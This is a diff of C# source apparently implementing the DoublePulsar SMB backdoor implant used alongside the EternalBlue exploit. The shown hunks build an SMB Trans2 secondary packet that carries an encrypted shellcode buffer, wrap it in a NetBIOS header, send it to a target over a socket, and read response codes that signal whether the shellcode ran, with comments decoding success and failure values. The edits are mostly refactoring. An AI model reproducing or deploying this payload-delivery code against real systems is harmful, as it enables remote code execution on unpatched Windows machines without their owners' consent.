@@ -816,7 +816,7 @@ namespace DoublePulsar
                     System.Console.WriteLine("Shellcode buffer...\n");
                     System.Console.WriteLine(HexDump(SC));
 
-                    _l.Info($"[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer");
+                    System.Console.WriteLine("[+] [{ip}] DOUBLEPULSAR - Encrypting shellcode buffer");
                     System.Console.WriteLine("Encrypting shellcode buffer...\n");
                     for (Int32 i = 0; i < SC.Length; i++)
                     {
@@ -885,7 +885,7 @@ namespace DoublePulsar
                         padding = 0x00
                     };
 
-                    EternalBlue.SMB_HEADER header = new EternalBlue.SMB_HEADER
+                    SMB_HEADER header = new SMB_HEADER
                     {
                         protocol = 0x424d53ff,
                         command = 0x32,
@@ -904,7 +904,7 @@ namespace DoublePulsar
                     };
 
                     //Merge SMBHeader with the transaction2SecondaryRequest
-                    byte[] headerBytes = EternalBlue.GetBytes(header);
+                    byte[] headerBytes = GetBytes(header);
 
                     transaction2SecondaryRequest.TotalDataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
                     transaction2SecondaryRequest.DataCount = (ushort)SC.Length; // Marshal.SizeOf(encrypted_payload);
@@ -912,7 +912,7 @@ namespace DoublePulsar
                     ushort byteCountOfEncryptedPayload = (ushort)(SC.Length + 13); // Marshal.SizeOf(encrypted_payload) + 13;
                     transaction2SecondaryRequest.ByteCount = (ushort)byteCountOfEncryptedPayload;
 
-                    byte[] transaction2SecondaryRequestbytes = EternalBlue.GetBytes(transaction2SecondaryRequest).ToArray();
+                    byte[] transaction2SecondaryRequestbytes = GetBytes(transaction2SecondaryRequest).ToArray();
                     byte[] pkt = headerBytes.Concat(transaction2SecondaryRequestbytes).ToArray();
 
                     System.Console.WriteLine(HexDump(pkt));
@@ -932,9 +932,9 @@ namespace DoublePulsar
                     System.Console.WriteLine("SMB packet does not have a size header.  Adding the header!");
                     uint size = (uint)pkt.Length;
                     byte[] intBytes = BitConverter.GetBytes(size).Reverse().ToArray();
-                    EternalBlue.NETBIOS_HEADER netbios_header = new EternalBlue.NETBIOS_HEADER();
+                    NETBIOS_HEADER netbios_header = new NETBIOS_HEADER();
                     netbios_header.MessageTypeAndSize = BitConverter.ToUInt32(intBytes, 0);
-                    byte[] netbios_header_packet = EternalBlue.GetBytes(netbios_header);
+                    byte[] netbios_header_packet = GetBytes(netbios_header);
                     byte[] fullMessage = netbios_header_packet.Concat(pkt).ToArray();
                     System.Console.WriteLine(HexDump(fullMessage));
 
@@ -947,18 +947,16 @@ namespace DoublePulsar
                     try
                     {
                         s.Send(fullMessage);
-                        //SendSMBMessage(sock, pkt, true);
-                        //return ReceiveSMBMessage(sock);
-
                         s.Receive(buf, 1024, SocketFlags.None);
                         final_response = buf;
-                        // Check for 0x51 response to indicate DOUBLEPULSAR infection
+                        // Check for 0x52 response to indicate DOUBLEPULSAR worked
+                        // 0x52 = success
+                        // 0x62 = parameter failure
+                        // 0x72 = alloc error
                         if (final_response[34] == 0x52)
                         {
                             System.Console.WriteLine("[{ip}] DOUBLEPULSAR - Returned {final_response[34]}.  SUCCESS!");
                         }
-
-
                     }
                     catch (Exception e)
                     {
